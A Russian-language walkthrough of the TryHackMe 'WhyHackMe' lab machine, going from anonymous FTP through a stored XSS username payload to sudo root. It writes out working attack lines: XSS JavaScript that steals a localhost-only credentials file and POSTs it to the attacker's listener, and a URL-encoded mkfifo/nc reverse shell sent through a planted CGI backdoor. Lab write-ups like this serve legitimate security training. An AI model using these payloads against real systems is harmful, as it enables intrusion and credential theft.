
- https://tryhackme.com/room/whyhackme
- XSS, LFI, backdoor
### Разведка
Сканируем сеть
nmap -sC -sV
- Стандартные скрипты
- сканирование версий

```
└─$ nmap -sC -sV 10.64.151.88 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-03 18:40 +0300
Nmap scan report for 10.64.151.88
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.180.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
21 - ftp - есть вход через anonymous
22 - ssh
80 - http

```
└─$ ftp 10.64.151.88                    
Connected to 10.64.151.88.
220 (vsFTPd 3.0.3)
Name (10.64.151.88:obsca): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||11536|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||34172|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |*************************************************************************|   318        2.69 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (1.32 KiB/s)
```

Подключаемся по FTP через Anonymous. Скачиваем единственный файл update.txt

```
ftp> get update.txt
```

Читаем файл
```
└─$ cat update.txt                          
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

Из этого сообщение становится известно о файле 127.0.0.1/dir/pass.txt на локальном хосте, как я понял, с кредами. 


### На http
<img width="1470" height="833" alt="Pasted image 20260104201752" src="https://github.com/user-attachments/assets/83eaf51d-d9bc-45fb-9718-7dc6ef88ebae" />


Видим некий блог. Переходим дальше. 


<img width="1470" height="847" alt="Pasted image 20260104201820" src="https://github.com/user-attachments/assets/14d83a36-5c43-4e65-b721-f6307629791c" />


Есть поле регистрации.

<img width="1470" height="849" alt="Pasted image 20260104201848" src="https://github.com/user-attachments/assets/05f4ea32-87f8-4dc3-90f5-6ff4e351cd8a" />


Попробовал разные XSS атаки в поле комментариев, но ничего нет...

<img width="1470" height="849" alt="Pasted image 20260104201908" src="https://github.com/user-attachments/assets/140a481f-3212-4da6-a51c-34fd3153fe9a" />



Пробую XSS в имени пользователя при регистрации.
<img width="1470" height="848" alt="Pasted image 20260104201917" src="https://github.com/user-attachments/assets/4cad3606-a65b-4ed9-ace2-3500ca26f776" />



<img width="1470" height="848" alt="Pasted image 20260104201933" src="https://github.com/user-attachments/assets/d6509ccc-d582-4160-bae9-35787f8d3587" />


Есть! Мы сделали хранимую XSS атаку через простой скрипт в имени пользователя. 

```
<script>alert(1)</script>
```

>**Хранимые**. Вредоносный код сохраняется на сервере и загружается с него каждый раз, когда пользователи запрашивают отображение той или иной страницы. Чаще всего проявляются там, где пользовательский ввод не проходит фильтрацию и сохраняется на сервере: форумы, блоги, чаты, журналы сервера и т.д. (В нашем случае комсентарий)
### Эксплуатация

Создадим нового пользователя с таким именем:
```
<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://192.168.180.184:9002", {method: "POST", body:y}));</script>
```

Что делает наш скрипт? Это классический XSS-payload для кражи файла с сервера жертвы. LFI в XSS.

Открываем порт и принимаем файл.
```
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.180.184] from (UNKNOWN) [10.64.181.102] 36712
POST / HTTP/1.1
Host: 192.168.180.184:9002
Connection: keep-alive
Content-Length: 32
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://127.0.0.1/blog.php
Accept-Encoding: gzip, deflate

jack:WhyIsMyPasswordSoStrongIDK
```
Отлично! Мы получили наши креды.

### User
```
ssh jack@10.64.181.102
The authenticity of host '10.64.181.102 (10.64.181.102)' can't be established.
ED25519 key fingerprint is: SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.64.181.102' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jack@10.64.181.102's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 04 Jan 2026 06:21:38 PM UTC

  System load:  0.19               Processes:             134
  Usage of /:   79.7% of 11.21GB   Users logged in:       0
  Memory usage: 32%                IPv4 address for eth0: 10.64.181.102
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ cat user.txt 
1ca4eb201787acbfcf9e70fca87b866a
```
Спокойно читаем наш user.txt 
### Root

Сразу смотрим что мы можем делать. 
```
jack@ubuntu:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```
Заметим, что мы имеем доступ к управлению iptables. Это firewall.


```
jack@ubuntu:~$ cd /opt
jack@ubuntu:/opt$ ls
capture.pcap  urgent.txt
jack@ubuntu:opt/$ cat urgent.txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
jack@ubuntu:~$ cd /usr/lib/cgi-bin/
-bash: cd: /usr/lib/cgi-bin/: Permission denied

```
Из этого сообщения мы знаем о наличии /cgi-bin/ и о том что, firewall блокирует какой-то трафик.

Пока что скачаем файл **capture.pcap** к себе на машину.
```
python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
192.168.180.184 - - [04/Jan/2026 18:38:22] "GET /capture.pcap HTTP/1.1" 200 -
```

Смотрим что вообще происходит в iptables:
```
jack@ubuntu:~$ sudo /usr/sbin/iptables -L --line-numbers
[sudo] password for jack: 
Sorry, try again.
[sudo] password for jack: 
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere  
```

Видим DROP на 41312 порту

```
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
```

Пока не понятно что на этом порту, но думаю включить стоит)

Включаем
```
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT

```

```

jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
2    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
3    ACCEPT     all  --  anywhere             anywhere            
4    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
6    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
8    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
9    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere            
jack@ubuntu:/opt$ curl localhost:41312
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
 Instead use the HTTPS scheme to access this URL, please.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.example.com Port 80</address>
</body></html>
```
При переходе по этому порту видим что используется https трафик.


Тут я перебрал директории в надежде что-то найти, но пока не особо понимаю что делать дальше.
```
ffuf -w /usr/share/wordlists/dirb/big.txt -u 'https://10.64.181.102:41312/FUZZ' -k

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.64.181.102:41312/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 138ms]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 139ms]
cgi-bin/                [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 136ms]

```

Есть некий **cgi-bin/** Это может означать что на этом порту лежит некий скрипт, который выполняется при подключении к нему 

И тут я вспомнил про сообщение.
>The cleanup of the server is still incomplete I need to start by deleting these files first.

Что если есть некоторые ключи или логи на сервере? 
```
sftp jack@10.64.181.102 
jack@10.10.157.184's password:  
Connected to 10.10.157.184. 
sftp> cd /etc/apache2/certs/ sftp> ls apache-certificate.crt    apache.key                 
sftp> get apache.key  Fetching /etc/apache2/certs/apache.key to apache.key apache.key
```
Отлично. Забираем **apache.key**

Теперь мы можем добавить наш **apache.key** в лог **capture.pcap** и посмотреть содержимое пакетов. Edit > Preferences > Protocols > TLS и добавляем **apache.key**. 

![[Pasted image 20260104222023.png]]
```
https://10.64.181.102:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
```
И мы видим некий лог с такой ссылкой.

```
curl -k -s 'https://10.64.181.102:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'

<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>

```
Отлично. Это бекдор, который оставил другой хакер, как было написано в сообщении. Этот бекдор просто выполняет команды записанные в конце после cmd=

Откроем порт для реверс шелла

```
└─$ nc -lvnp 4444
listening on [any] 4444 ...


```


Сделаем реверс шелл с revshells.com. 
```
curl -k -s 'https://10.64.181.102:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.180.184%204444%20%3E%2Ftmp%2Ff' 
```

Откроем порт и получим наш шелл.
```
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.180.184] from (UNKNOWN) [10.64.181.102] 43208
bash: cannot set terminal process group (883): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'

```

Мы внутри за www-data. Смотрим что можем делать.
```
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

Хе хе хе. Мы можем делать ВСЕ!

Запускаем оболочку и получаем наш root!
```
www-data@ubuntu:/usr/lib/cgi-bin$ sudo bash
sudo bash
root@ubuntu:/usr/lib/cgi-bin# cat /root/root.txt
cat /root/root.txt
4dbe2259ae53846441cc2479b5475c72 
```

## Итог: почему удалось взломать?

- XSS атака. Не смотря на защиту от SQLi, нет экранирования XSS.
- Нет ликвидаций последствий прошлой атаки - остался бекдор.
- Можно еще сказать про комментарии на ftp и самой машине, но это уже CTF тема.

Довольно интересный получился взлом. XSS атака в имени пользователя. Бекдор который оставил другой хакер. 
